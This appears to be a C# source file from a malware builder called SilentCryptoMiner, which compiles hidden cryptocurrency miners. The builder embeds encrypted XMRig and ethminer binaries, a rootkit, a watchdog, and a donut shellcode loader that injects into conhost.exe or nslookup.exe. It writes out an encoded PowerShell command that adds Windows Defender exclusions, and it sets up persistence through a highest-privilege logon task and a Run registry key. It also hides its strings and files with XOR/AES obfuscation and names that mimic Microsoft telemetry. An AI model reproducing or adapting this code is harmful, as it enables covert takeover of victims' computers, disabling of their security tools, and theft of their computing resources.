using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.CSharp;

namespace SilentCryptoMiner
{
    public class Codedom
    {
        public static Builder F;
        public static string killWDCommands = $"cmd /c powershell -EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes("Add-MpPreference -ExclusionPath @($env:UserProfile,$env:SystemDrive) -Force"))}\" & powershell -EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes("Add-MpPreference -ExclusionExtension @('exe','dll') -Force"))}\" & exit";

        public static bool MinerCompiler(string savePath, string code, string iconPath = "", bool requireAdministrator = false)
        {
            var providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v4.0");
            var CodeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:winexe /platform:x64 /optimize ";

            if (!F.toggleShellcode.Checked)
            {
                if (requireAdministrator)
                {
                    File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
                    OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
                }

                if (!string.IsNullOrEmpty(iconPath))
                {
                    OP += " /win32icon:\"" + iconPath + "\"";
                }
            }

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");

            using (var R = new System.Resources.ResourceWriter(System.IO.Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources"))
            {
                if (F.mineXMR) { 
                    R.AddResource(F.Resources_xmr, F.AES_Encryptor(Properties.Resources.xmrig));
                    R.AddResource(F.Resources_winring, F.AES_Encryptor(Properties.Resources.WinRing0x64));
                    if (F.xmrGPU)
                    {
                        R.AddResource(F.Resources_libs, F.AES_Encryptor(Properties.Resources.libs));
                    }
                }
                if (F.mineETH)
                {
                    R.AddResource(F.Resources_eth, F.AES_Encryptor(Properties.Resources.ethminer));
                }
                if (F.chkInstall.Checked && F.toggleWatchdog.Checked)
                {
                    R.AddResource(F.Resources_watchdog, F.AES_Encryptor(F.watchdogdata));
                }
                if (F.toggleRootkit.Checked)
                {
                    R.AddResource(F.Resources_rootkiti, F.AES_Encryptor(Properties.Resources.rootkit_i));
                }

                R.Generate();
            }

            parameters.EmbeddedResources.Add(System.IO.Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources");
            var minerbuilder = new StringBuilder(code);
            ReplaceGlobals(ref minerbuilder);
            var Results = CodeProvider.CompileAssemblyFromSource(parameters, minerbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
                File.Delete(Environment.GetFolderPath((Environment.SpecialFolder)35) + @"\icon.ico");
                File.Delete(System.IO.Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources");
            }
            catch { }

            if (Results.Errors.HasErrors)
            {
                foreach (CompilerError E in Results.Errors)
                {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }
            return true;
        }

        public static bool WatchdogCompiler(string savePath, string code, bool requireAdministrator = false)
        {
            var providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v4.0");
            var CodeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:winexe /platform:x64 /optimize ";
            if (requireAdministrator)
            {
                File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
                OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
            }

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            if (F.toggleDebug.Checked)
            {
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            }

            var watchdogbuilder = new StringBuilder(code);
            ReplaceGlobals(ref watchdogbuilder);
            watchdogbuilder.Replace("MINERSET", string.Join(",", F.fullnids));
            var Results = CodeProvider.CompileAssemblyFromSource(parameters, watchdogbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
            }
            catch { }

            if (Results.Errors.HasErrors)
            {
                foreach (CompilerError E in Results.Errors) {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }
            return true;
        }

        public static bool CheckerCompiler(string savePath)
        {
            var providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v4.0");
            var codeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:exe /platform:x64 /optimize ";
            if (F.toggleAdministrator.Checked)
            {
                File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
                OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
            }

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
            if (F.toggleDebug.Checked)
            {
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            }

            var checkerbuilder = new StringBuilder(Properties.Resources.Checker);
            ReplaceGlobals(ref checkerbuilder);
            var results = codeProvider.CompileAssemblyFromSource(parameters, checkerbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
            }
            catch { }

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError E in results.Errors)
                {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }
            return true;
        }

        public static bool UninstallerCompiler(string savePath)
        {
            var providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v4.0");
            var codeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:winexe /platform:x64 /optimize ";
            if (F.toggleAdministrator.Checked)
            {
                File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
                OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
            }

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
            if (F.toggleDebug.Checked)
            {
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            }

            if (F.toggleRootkit.Checked)
            {
                using (var R = new System.Resources.ResourceWriter(Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources"))
                {
                    R.AddResource(F.Resources_rootkitu, F.AES_Encryptor(Properties.Resources.rootkit_u));
                    R.Generate();
                }

                parameters.EmbeddedResources.Add(Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources");
            }

            var uninstallerbuilder = new StringBuilder(Properties.Resources.Uninstaller);
            ReplaceGlobals(ref uninstallerbuilder);
            var results = codeProvider.CompileAssemblyFromSource(parameters, uninstallerbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
                File.Delete(Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources");
            }
            catch { }

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError E in results.Errors)
                {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }
            return true;
        }

        public static bool LoaderCompiler(string savePath, string inputFile, string args, string icoPath = "", bool AssemblyData = false, bool requireAdministrator = false, bool isWatchdog = false)
        {
            try
            {
                string currentDirectory = Path.GetDirectoryName(savePath);
                string filename = Path.GetFileNameWithoutExtension(savePath);
                var paths = new Dictionary<string, string>() { 
                    { "current", currentDirectory }, 
                    { "includes", Path.Combine(currentDirectory, "Includes") }, 
                    { "compilers", Path.Combine(currentDirectory, "Compilers") }, 
                    { "compilerslog", Path.Combine(currentDirectory, @"Compilers\logs") }, 
                    { "windres", Path.Combine(currentDirectory, @"Compilers\MinGW64\bin\windres.exe") }, 
                    { "tcc", Path.Combine(currentDirectory, @"Compilers\tinycc\tcc.exe") }, 
                    { "donut", Path.Combine(currentDirectory, @"Compilers\donut\donut.exe") }, 
                    { "windreslog", Path.Combine(currentDirectory, @"Compilers\logs\windres.log") }, 
                    { "tcclog", Path.Combine(currentDirectory, @"Compilers\logs\tcc.log") }, 
                    { "donutlog", Path.Combine(currentDirectory, @"Compilers\logs\donut.log") }, 
                    { "manifest", Path.Combine(currentDirectory, "administrator.manifest") }, 
                    { "resource.rc", Path.Combine(currentDirectory, "resource.rc") }, 
                    { "resource.o", Path.Combine(currentDirectory, "resource.o") }, 
                    { "loader", Path.Combine(currentDirectory, "loader.bin") }, 
                    { "filename", Path.Combine(currentDirectory, filename) } };
                var directoryFilter = F.CheckNonASCII(savePath);
                if (F.BuildErrorTest(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter.ToString()))))
                    return false;
                if (F.BuildErrorTest(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number."))
                    return false;
                if (!Directory.Exists(paths["compilers"]))
                {
                    using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Compilers)))
                    {
                        archive.ExtractToDirectory(paths["compilers"]);
                    }
                }

                if (!Directory.Exists(paths["includes"]))
                {
                    using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Includes)))
                    {
                        archive.ExtractToDirectory(paths["includes"]);
                    }
                }

                var sb = isWatchdog ? new StringBuilder(Properties.Resources.Injector) : new StringBuilder(Properties.Resources.Loader);
                bool buildResource = !string.IsNullOrEmpty(icoPath) || requireAdministrator || AssemblyData;
                if (buildResource)
                {
                    if (F.BuildErrorTest(!string.Join("", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }).All(new Func<char, bool>(char.IsDigit)), "Error: Assembly Version must only contain numbers."))
                        return false;
                    var resource = new StringBuilder(Properties.Resources.resource);
                    string defs = "";
                    if (!string.IsNullOrEmpty(icoPath))
                    {
                        resource.Replace("#ICON", ToLiteral(icoPath));
                        defs += " -DDefIcon";
                    }

                    if (requireAdministrator)
                    {
                        File.WriteAllBytes(paths["manifest"], Properties.Resources.administrator);
                        defs += " -DDefAdmin";
                        sb.Replace("DefWD", "TRUE");
                    }

                    if (AssemblyData)
                    {
                        resource.Replace("#TITLE", ToLiteral(F.txtAssemblyTitle.Text));
                        resource.Replace("#DESCRIPTION", ToLiteral(F.txtAssemblyDescription.Text));
                        resource.Replace("#COMPANY", ToLiteral(F.txtAssemblyCompany.Text));
                        resource.Replace("#PRODUCT", ToLiteral(F.txtAssemblyProduct.Text));
                        resource.Replace("#COPYRIGHT", ToLiteral(F.txtAssemblyCopyright.Text));
                        resource.Replace("#TRADEMARK", ToLiteral(F.txtAssemblyTrademark.Text));
                        resource.Replace("#VERSION", string.Join(",", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }));
                        defs += " -DDefAssembly";
                    }

                    File.WriteAllText(paths["resource.rc"], resource.ToString());
                    RunExternalProgram("cmd", string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff {1}", paths["windres"], defs), currentDirectory, paths["windreslog"]);
                    File.Delete(paths["resource.rc"]);
                    File.Delete(paths["manifest"]);
                    if (F.BuildErrorTest(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
                        return false;
                }

                RunExternalProgram(paths["donut"], string.Format("\"{0}\" -a 2 -f 1", inputFile), currentDirectory, paths["donutlog"]);
                string shellcodebytes = File.ReadAllText(paths["loader"], Encoding.GetEncoding("ISO-8859-1"));
                string shellcode = Convert.ToBase64String(Encoding.GetEncoding("ISO-8859-1").GetBytes(Cipher(shellcodebytes, F.KEY)));
                sb.Replace("#KEYLENGTH", F.KEY.Length.ToString());
                sb.Replace("#KEY", F.KEY);
                sb.Replace("#DELAY", F.txtStartDelay.Text);
                sb.Replace("#SHELLCODELENGTH", shellcodebytes.Length.ToString());
                sb.Replace("#SHELLCODE", shellcode);
                sb.Replace("#ARGS", args);
                CipherReplace(sb, "#ENV", "SystemRoot");
                CipherReplace(sb, "#TARGET", F.toggleRootkit.Checked ? "System32\\nslookup.exe" : "System32\\conhost.exe");
                CipherReplace(sb, "#FORMAT1", @"%s\%s");
                CipherReplace(sb, "#FORMAT2", "\"%s\" \"%s\"");
                if (F.toggleKillWD.Checked)
                {
                    sb.Replace("DefKillWD", "TRUE");
                    CipherReplace(sb, "#KILLWD", killWDCommands);
                }
                File.WriteAllText(paths["filename"] + ".c", sb.ToString());
                RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\" ", filename + ".c", buildResource ? "resource.o" : "", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
                File.Delete(paths["resource.o"]);
                File.Delete(paths["filename"] + ".c");
                File.Delete(paths["loader"]);
                if (F.BuildErrorTest(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["tcclog"])))
                    return false;
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: An error occured while building the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            return true;
        }

        public static void RunExternalProgram(string filename, string arguments, string workingDirectory, string logpath)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = filename;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.WorkingDirectory = workingDirectory;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardError = true;
                process.Start();

                using (StreamWriter writer = File.AppendText(logpath))
                {
                    writer.Write(process.StandardError.ReadToEnd());
                }
                process.WaitForExit();
            }
        }

        public static void CipherReplace(StringBuilder source, string id, string value)
        {
            source.Replace(id + "LENGTH", value.Length.ToString());
            source.Replace(id, ToLiteral(Cipher(value, F.KEY)));
        }

        public static string Cipher(string data, string key)
        {
            var result = new char[data.Length];
            for (int c = 0; c < data.Length; c++)
                result[c] = (char)((uint)data[c] ^ key[c % key.Length]);
            return string.Join("", result);
        }

        public static string CipherBytes(byte[] data, string key)
        {
            var result = new char[data.Length];
            for (int c = 0; c < data.Length; c++)
                result[c] = (char)((uint)data[c] ^ key[c % key.Length]);
            return string.Join("", result);
        }

        public static string ToLiteral(string input)
        {
            var literal = new StringBuilder(input.Length + 2);
            foreach (var c in input)
            {
                switch (c)
                {
                    case '\"': literal.Append("\\\""); break;
                    case '\\': literal.Append(@"\\"); break;
                    case '\0': literal.Append(@"\u0000"); break;
                    case '\a': literal.Append(@"\a"); break;
                    case '\b': literal.Append(@"\b"); break;
                    case '\f': literal.Append(@"\f"); break;
                    case '\n': literal.Append(@"\n"); break;
                    case '\r': literal.Append(@"\r"); break;
                    case '\t': literal.Append(@"\t"); break;
                    case '\v': literal.Append(@"\v"); break;
                    default:
                        literal.Append(c);
                        break;
                }
            }
            return literal.ToString();
        }

        public static void ReplaceGlobals(ref StringBuilder stringb)
        {
            if (F.mineXMR)
            {
                stringb.Replace("DefXMR", "true");
            }

            if (F.mineETH)
            {
                stringb.Replace("DefETH", "true");
            }

            if (F.toggleKillWD.Checked)
            {
                stringb.Replace("DefKillWD", "true");
                stringb.Replace("#KillWDCommands", F.EncryptString(killWDCommands));
            }

            if (F.toggleRootkit.Checked)
            {
                stringb.Replace("DefRootkit", "true");
            }

            if (F.toggleHideFile.Checked)
            {
                stringb.Replace("DefHideFile", "true");
            }

            if (F.toggleDebug.Checked)
            {
                stringb.Replace("DefDebug", "true");
            }

            if (F.xmrGPU)
            {
                stringb.Replace("DefGPU", "true");
            }

            if (F.toggleShellcode.Checked)
            {
                stringb.Replace("DefShellcode", "true");
            }

            if (F.chkInstall.Checked)
            {
                stringb.Replace("DefInstall", "true");
                string installdir;
                switch (F.Invoke(new Func<string>(() => F.txtInstallPath.Text)) ?? "")
                {
                    case "AppData":
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
                            break;
                        }

                    case "UserProfile":
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)";
                            break;
                        }

                    case "Temp":
                        {
                            installdir = "Path.GetTempPath()";
                            break;
                        }

                    default:
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
                            break;
                        }
                }

                stringb.Replace("PayloadPath", $"System.IO.Path.Combine({installdir}, _rGetString_(\"{F.EncryptString(F.txtInstallFileName.Text)}\"))");

                if (F.toggleWatchdog.Checked)
                {
                    stringb.Replace("DefWatchdog", "true");
                }
            }

            if (F.chkAssembly.Checked)
            {
                stringb.Replace("DefAssembly", "true");
                stringb.Replace("%Title%", F.txtAssemblyTitle.Text);
                stringb.Replace("%Description%", F.txtAssemblyDescription.Text);
                stringb.Replace("%Company%", F.txtAssemblyCompany.Text);
                stringb.Replace("%Product%", F.txtAssemblyProduct.Text);
                stringb.Replace("%Copyright%", F.txtAssemblyCopyright.Text);
                stringb.Replace("%Trademark%", F.txtAssemblyTrademark.Text);
                stringb.Replace("%v1%", F.txtAssemblyVersion1.Text);
                stringb.Replace("%v2%", F.txtAssemblyVersion2.Text);
                stringb.Replace("%v3%", F.txtAssemblyVersion3.Text);
                stringb.Replace("%v4%", F.txtAssemblyVersion4.Text);
            }

            stringb.Replace("#LIBSPATH", F.EncryptString(@"Microsoft\Libs\"));
            stringb.Replace("#WATCHDOGPATH", F.EncryptString(@"Microsoft\Telemetry\"));
            stringb.Replace("#WATCHDOGID", F.EncryptString($"\"{F.watchdogID}\""));
            stringb.Replace("#XID", F.EncryptString(F.xid));
            stringb.Replace("#EID", F.EncryptString(F.eid));
            stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"));
            stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(F.txtInstallFileName.Text) + "\" /tr \"{0}\""));
            stringb.Replace("#REGADD", F.EncryptString(@"cmd /c reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v """ + Path.GetFileNameWithoutExtension(F.txtInstallFileName.Text) + "\" /t REG_SZ /F /D \"{0}\""));
            stringb.Replace("#MINERQUERY", F.EncryptString($"Select CommandLine from Win32_Process WHERE CommandLine LIKE '%{F.minerFind}%'"));
            stringb.Replace("#GPUQUERY", F.EncryptString("SELECT Name, VideoProcessor FROM Win32_VideoController"));
            stringb.Replace("#MINERID", F.EncryptString(F.minerFind));
            stringb.Replace("#SCMD", F.EncryptString("cmd"));
            stringb.Replace("#CMDSTART", F.EncryptString("cmd /c \"{0}\""));
            stringb.Replace("#CMDKILL", F.EncryptString("cmd /c taskkill /f /PID \"{0}\""));
            stringb.Replace("#SYSTEMROOT", F.EncryptString("SystemRoot"));
            stringb.Replace("#NSLOOKUP", F.EncryptString("System32\\nslookup.exe"));

            stringb.Replace("#KEY", F.AESKEY);
            stringb.Replace("#SALT", F.SALT);
            stringb.Replace("#IV", F.IV);
            stringb.Replace("#UNAMKEY", F.EncryptString(F.UNAMKEY));
            stringb.Replace("#UNAMIV", F.EncryptString(F.UNAMIV));

            stringb.Replace("#RESPARENT", F.Resources_parent);
            stringb.Replace("#RESETH", F.Resources_eth);
            stringb.Replace("#RESXMR", F.Resources_xmr);
            stringb.Replace("#RESLIBS", F.Resources_libs);
            stringb.Replace("#RESWD", F.Resources_watchdog);
            stringb.Replace("#RESRKI", F.Resources_rootkiti);
            stringb.Replace("#RESRKU", F.Resources_rootkitu);
            stringb.Replace("#RESWR", F.Resources_winring);

            stringb.Replace("startDelay", F.txtStartDelay.Text);

            foreach (Match m in Regex.Matches(stringb.ToString(), "_r(.+?)_"))
            {
                foreach (Capture c in m.Captures)
                    stringb.Replace(c.Value, F.Randomi(F.rand.Next(5, 40)));
            }
        }
    }
}